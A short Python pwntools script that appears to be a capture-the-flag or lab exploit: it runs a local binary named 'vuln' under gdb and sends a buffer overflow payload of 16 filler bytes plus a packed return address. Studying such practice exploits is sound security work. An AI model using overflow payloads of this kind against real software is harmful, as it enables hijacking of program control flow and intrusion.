from pwn import *

# p = process('./vuln')
p = gdb.debug('./vuln', gdbscript=''''
b *0x0804926d
''')

payload = b''

payload += b'A' * 16
payload += p32(0x080491e0)
# payload += p32(0x080491e0)
payload += b'\n'

p.sendline(payload)

# p.interactive()